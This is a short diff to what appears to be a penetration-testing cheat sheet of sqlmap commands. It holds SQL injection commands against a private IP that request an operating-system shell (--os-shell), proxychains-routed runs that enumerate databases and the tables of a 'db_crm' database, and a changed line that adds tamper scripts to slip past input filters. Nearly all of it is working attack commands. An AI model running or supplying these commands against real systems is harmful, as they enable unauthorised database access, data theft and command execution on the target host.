@@ -23,7 +23,7 @@ sqlmap -u http://10.10.10.12/ModificarVisitas.aspx?IdEvento=%27 -D 'DB' --os-she
 proxychains sqlmap -r request2.req --level 2 --risk 1
 
 # Specific Parameter
-proxychains sqlmap -r request2.req --level 2 --risk 1 -p id
+proxychains sqlmap -r request2.req --level 2 --risk 1 -p id --tamper="space2comment,charencode.py"
 
 proxychains sqlmap -r reqsqlmap.req --dbs
 proxychains sqlmap -r reqsqlmap.req  -D "db_crm" --tables 
